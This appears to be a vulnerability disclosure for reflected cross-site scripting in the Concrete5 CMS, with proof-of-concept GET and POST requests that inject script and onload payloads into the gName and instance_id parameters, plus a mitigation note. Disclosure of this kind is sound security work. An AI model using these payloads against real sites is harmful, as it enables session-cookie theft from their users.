About Concrete5 (from Wikipedia):
Concrete5 is an open source content management system (CMS) for publishing content on the World Wide Web and intranets.
Concrete5 was designed for ease of use, for users with a minimum of technical skills. It enables users to edit site content directly from the page. It provides version management for every page, similar to wiki software, another type of web site development software. concrete5 allows users to edit images through an embedded editor on the page.

Description:
Concrete5 is vulnerable to Cross-Site Scripting, both bulkupdate.php and sitemap_drag_request.php scripts fail to properly sanitize user-supplied input.

PoC Exploit:
bulkupdate.php XSS is exploitable through $_REQUEST['gName']

Using HTTP GET Method:
http://target/index.php/dashboard/users/groups/bulkupdate/search?gName="><script>alert(document.cookie)</script>&ccm-submit-button=Search

Using HTTP POST Method:
POST http://target/index.php/dashboard/users/groups/bulkupdate/search

POST DATA:
gName="><script>alert(document.cookie)</script>&ccm-submit-button=Search


sitemap_drag_request.php XSS is triggered through $_REQUEST['instance_id'] but requires a valid ccm_token value which makes it unexploitable (unless the attacker somehow obtains a valid token)

Using HTTP GET Method:
http://target/index.php/tools/required/dashboard/sitemap_drag_request?origCID=147&destCID=148&instance_id="><BODY ONLOAD=alert(document.cookie)>&ctask=MOVE&ccm_token=1418116264:3ac1b1774e77fbc61b1c6b97a4f7c9ea&dragMode=over

Mitigation:
Validate/Sanitize user supplied-input through $_REQUEST['gName'] and $_REQUEST['instance_id']
